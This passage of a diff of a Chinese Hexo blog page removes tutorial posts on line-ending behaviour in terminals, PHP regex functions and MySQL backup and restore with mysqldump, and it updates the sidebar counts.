class="number">4.</span>	<span class="keyword">this</span> is</span><br><span class="line"><span class="number">5.</span>	a test</span><br></pre></td></tr></table></figure>
-<pre><code>第一条打印语句，\r使光标移动到本行行首，然后打印a test覆盖this i，变成a tests
-第二条打印语句，\n使光标移动到下一行行首，然后打印a test
-第三条打印语句，\r\n使光标移动到本行行首，然后移动到下一行行首，然后打印a test
-
-然后在linux下，用stty设置关闭ONLCR转换:
-stty -onlcr
-发现输出变为：
-1.    a tests
-2.    this is
-3.             a test
-4.    this is
-5.    a test
-看起来，第二条打印语句的\n行为是“将光标移动到下一行当前位置”
-在linux系统下，onlcr是控制nl转换到cr nl。
-也就是说正常情况下\n被转换成了\r\n，然后送到屏幕上显示，所以第二个输出语句看到的效果是回到下一行行首。
-
-stty -onlcr也就是关闭nl转换到cr nl，这时候送到屏幕上的只有\n，看到结果是移动到下一行当前位置。
-
-
-\r\n是一个让人郁闷的问题，windows和我们的嵌入式系统之间交互总是有问题，所以想搞明白这个问题。
-网络上搜\r\n也可以看到很多OS之间、协议之间交互的问题。
-</code></pre><h1 id="四、-正则表达式的函数："><a href="#四、-正则表达式的函数：" class="headerlink" title="四、 正则表达式的函数："></a>四、 正则表达式的函数：</h1><pre><code>preg_grep --  返回与模式匹配的数组单元 
-**preg_match_all** -- 进行全局正则表达式匹配 , 返回共计匹配的个数。 
-    和下面的一样，不同的是匹配到最后（全局匹配） 
-**preg_match** -- 进行正则表达式匹配，只匹配一次，返回1，否则0， 
-    格式：preg_match(&quot;正则表达式&quot;,&quot;被匹配的字串&quot;,存放结果的变量名,PREG_OFFSET_CAPTURE,起始偏移量) 
-    其中：PREG_OFFSET_CAPTURE表示获取匹配索引位置 
-          起始偏移量：从指定位置开始匹配 
-preg_quote -- 转义正则表达式字符 
-preg_split -- 用正则表达式分割字符串 
-**preg_replace** -- 执行正则表达式的搜索和替换
-</code></pre><h2 id="preg-match-all-执行多次"><a href="#preg-match-all-执行多次" class="headerlink" title="preg_match_all 执行多次"></a>preg_match_all 执行多次</h2><p><strong>执行一个全局正则表达式匹配</strong><br>搜索subject中所有匹配pattern给定正则表达式的匹配结果并且将它们以flag指定顺序输出到matches中<br>在第一个匹配找到后, 子序列继续从最后一次匹配位置搜索</p>
-<p>int preg_match_all ( string $pattern , string $subject [, array &amp;$matches [, int $flags = PREG_PATTERN_ORDER [, int $offset = 0 ]]] )<br>参数 说明：</p>
-<h3 id="1-pattern"><a href="#1-pattern" class="headerlink" title="1.pattern"></a>1.pattern</h3><p>要搜索的模式，字符串形式。 </p>
-<h3 id="2-subject"><a href="#2-subject" class="headerlink" title="2.subject"></a>2.subject</h3><p>输入字符串。 </p>
-<h3 id="3-matches"><a href="#3-matches" class="headerlink" title="3.matches"></a>3.matches</h3><p>多维数组，作为输出参数输出所有匹配结果, 数组排序通过flags指定。 </p>
-<h3 id="4-flags"><a href="#4-flags" class="headerlink" title="4.flags"></a>4.flags</h3><p>可以结合下面标记使用(注意不能同时使用PREG_PATTERN_ORDER和 PREG_SET_ORDER)： </p>
-<h4 id="PREG-PATTERN-ORDER（默认）"><a href="#PREG-PATTERN-ORDER（默认）" class="headerlink" title="PREG_PATTERN_ORDER（默认）"></a>PREG_PATTERN_ORDER（默认）</h4><p>结果排序为$matches[0]保存完整模式的所有匹配, $matches[1] 保存第一个子组的所有匹配，以此类推。<br><img src="/2019/02/14/PHP正则表达式/函数1.png" alt=""> </p>
-<h4 id="PREG-SET-ORDER"><a href="#PREG-SET-ORDER" class="headerlink" title="PREG_SET_ORDER"></a>PREG_SET_ORDER</h4><p>结果排序为$matches[0]包含第一次匹配得到的所有匹配(包含子组)， $matches[1]是包含第二次匹配到的所有匹配(包含子组)的数组，以此类推。<br><img src="/2019/02/14/PHP正则表达式/函数2.png" alt=""></p>
-<h4 id="PREG-OFFSET-CAPTURE"><a href="#PREG-OFFSET-CAPTURE" class="headerlink" title="PREG_OFFSET_CAPTURE"></a>PREG_OFFSET_CAPTURE</h4><p>如果这个标记被传递，每个发现的匹配返回时会增加它相对目标字符串的偏移量。 注意这会改变matches中的每一个匹配结果字符串元素，使其 成为一个第0个元素为匹配结果字符串，第1个元素为 匹配结果字符串在subject中的偏移量<br><img src="/2019/02/14/PHP正则表达式/函数3.png" alt=""></p>
-<h3 id="5-offset"><a href="#5-offset" class="headerlink" title="5.offset"></a>5.offset</h3><p>通常， 查找时从目标字符串的开始位置开始。可选参数offset用于 从目标字符串中指定位置开始搜索(单位是字节)。 </p>
-<h2 id="preg-match-执行一次"><a href="#preg-match-执行一次" class="headerlink" title="preg_match  执行一次"></a>preg_match  执行一次</h2><pre><code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )
-</code></pre><p>第一个参数：正则表达式：pattern<br>pattern：要搜索的模式。可以使一个字符串或字符串数组。<br>第二个参数：要替换的字符串：replacement</p>
-<p>第三个参数：目标字符串：subject<br>要进行搜索和替换的字符串或字符串数组。<br>如果subject是一个数组，搜索和替换回在subject 的每一个元素上进行, 并且返回值也会是一个数组。<br><img src="/2019/02/14/PHP正则表达式/函数4.png" alt=""></p>
-<p>如何使中间部分不变，只将div标签替换成a标签？<br>联系正则表达式中的（）和\\  由于\\指的使（）中的内容，所以我们可以使用\\保留原来的字符串<br><img src="/2019/02/14/PHP正则表达式/函数5.png" alt=""><br>也可以同时替换多个<br><img src="/2019/02/14/PHP正则表达式/函数6.png" alt=""><br>replacement中可以包含反向引用\\n 或$n，语法上首选后者。<br><img src="/2019/02/14/PHP正则表达式/函数7.png" alt=""></p>
-<p>我们还能在标签内部也使用（）和对应的反斜杠或$ 来保留标签样式<br><img src="/2019/02/14/PHP正则表达式/函数8.png" alt=""></p>
-<p>第四个参数limit（可选）<br>每个模式在每个subject上进行替换的最大次数。默认是 -1(无限)。 </p>
-<p>第五个参数count（可选）<br>如果指定，将会被填充为完成的替换次数。 </p>
-<p>和str_replace一样，第一个参数和第二个参数都可以是数组<br>如果pattern（第一个参数）和replacement（第二个参数） 都是数组，每个pattern使用replacement中对应的 元素进行替换。如果replacement中的元素比pattern中的少， 多出来的pattern使用空字符串进行替换。<br><img src="/2019/02/14/PHP正则表达式/函数9.png" alt=""></p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/02/12/mysql22-整库数据备份与还原/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/02/12/mysql22-整库数据备份与还原/" class="post-title-link" itemprop="url">mysql22-整库数据备份与还原</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Post created: 2019-02-12 19:20:59 / Updated at: 19:50:53" itemprop="dateCreated datePublished" datetime="2019-02-12T19:20:59+08:00">2019-02-12</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">in</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/mysql/" itemprop="url" rel="index"><span itemprop="name">mysql</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="整库数据备份与还原"><a href="#整库数据备份与还原" class="headerlink" title="整库数据备份与还原"></a>整库数据备份与还原</h1><p>整库数据备份也叫SQL数据备份：备份的结果都是SQL指令</p>
-<p>在mysql中提供了一个专门用于备份sql的客户端：mysqldump.exe<br><img src="/2019/02/12/mysql22-整库数据备份与还原/1.png" alt=""></p>
-<h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>SQL备份是一种mysql非常常见的备份与还原方式，SQL备份不只是备份数据，还备份对应的SQL指令（包含数据与表结构）：即便是数据库遭到毁灭性的破坏（数据库被删），那么利用sql备份依然可以实现数据还原</p>
-<p>sql备份因为需要备份结构，因此产生的备份文件特别大，因此不适合特大型数据备份，也不适合数据变化频繁型数据库备份</p>
-<h2 id="应用方案"><a href="#应用方案" class="headerlink" title="应用方案"></a>应用方案</h2><h2 id="SQL备份"><a href="#SQL备份" class="headerlink" title="SQL备份"></a>SQL备份</h2><p>sql备份用到的是专门的备份客户端，因此还没与数据库服务器进行连接</p>
-<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p>mysqldump/mysqldump.exe   -hPup 数据库名字【表1   【表2。。。】】 &gt;备份文件地址<br>注：</p>
-<ul>
-<li>此时在windowsCMD环境下，而不是在sql，所以不需要语法的分号。</li>
-<li>-h，-P可省略</li>
-</ul>
-<p>备份可以有三种方式</p>
-<ol>
-<li>整库备份（只需要提供数据库名字）<br><img src="/2019/02/12/mysql22-整库数据备份与还原/2.png" alt=""></li>
-<li>单表备份：数据库后面跟一张表</li>
-<li>多表备份：数据库后跟多张表<br><img src="/2019/02/12/mysql22-整库数据备份与还原/3.png" alt=""></li>
-</ol>
-<p>查看备份的成果<br><img src="/2019/02/12/mysql22-整库数据备份与还原/4.png" alt=""></p>
-<p>查看备份文件中的具体内容<br><img src="/2019/02/12/mysql22-整库数据备份与还原/5.png" alt=""></p>
-<h2 id="数据还原"><a href="#数据还原" class="headerlink" title="数据还原"></a>数据还原</h2><p>mysql提供了多种方式来实现：两种<br>mysqldump备份的数据中没有关于数据库本身的操作，都是针对表级别的擦欧总：当进行数据（sql还原），必须指定数据库</p>
-<h3 id="利用mysql-exe客户端"><a href="#利用mysql-exe客户端" class="headerlink" title="利用mysql.exe客户端"></a>利用mysql.exe客户端</h3><ol>
-<li>利用mysql.exe客户端：没有登录之前，可以直接用改客户端进行数据还原<br>mysql.exe-hPup数据库 &lt;文件位置<br><img src="/2019/02/12/mysql22-整库数据备份与还原/6.png" alt=""><h3 id="导入SQL指令"><a href="#导入SQL指令" class="headerlink" title="导入SQL指令"></a>导入SQL指令</h3></li>
-<li><p>在sql指令，提供了一种导入SQL指令的方式<br>source   SQL 文件位置；  //必须先进入对应的数据库<br><img src="/2019/02/12/mysql22-整库数据备份与还原/7.png" alt=""></p>
-</li>
-<li><p>人为操作：打开备份文件，复制所以SQL指令，然后到mysql.exe客户端中粘贴执行（不推荐）类似第二种</p>
-</li>
-</ol>
-<h2 id="本机动手操作："><a href="#本机动手操作：" class="headerlink" title="本机动手操作："></a>本机动手操作：</h2><pre><code>D:\php\PHPTutorial\MySQL\binmysqldump.exe -uroot -proot mydatabase &gt;C:\Users\华\Desktop\my\mydatabase.sql//CMD命令备份
-</code></pre><p><br><br><code>drop database mydatabase;//sql指令删除了数据库mydatabase</code><br><br><br><img src="/2019/02/12/mysql22-整库数据备份与还原/1.png" alt=""><br>开始还原：<br><img src="/2019/02/12/mysql22-整库数据备份与还原/8.png" alt=""><br>    create database mydatabase; //sql指令先创建数据库<br><br><br>    D:\php\PHPTutorial\MySQL\bin\mysql.exe -uroot -proot mydatabase &lt; C:\Users\华\Desktop\my\mydatabase.sql     //cmd命令行下还原<br><img src="/2019/02/12/mysql22-整库数据备份与还原/9.png" alt=""><br>还原成功</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2581,7 +2417,7 @@ preg_split -- 用正则表达式分割字符串
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">55</span>
+                    <span class="site-state-item-count">59</span>
                     <span class="site-state-item-name">Artikel</span>
                   </a>
                 </div>
@@ -2610,7 +2446,9 @@ preg_split -- 用正则表达式分割字符串
                     
                       
                     
-                    <span class="site-state-item-count">8</span>
+                      
+                    
+                    <span class="site-state-item-count">9</span>
                     <span class="site-state-item-name">Kategorien</span>
                   </a>
                 </div>
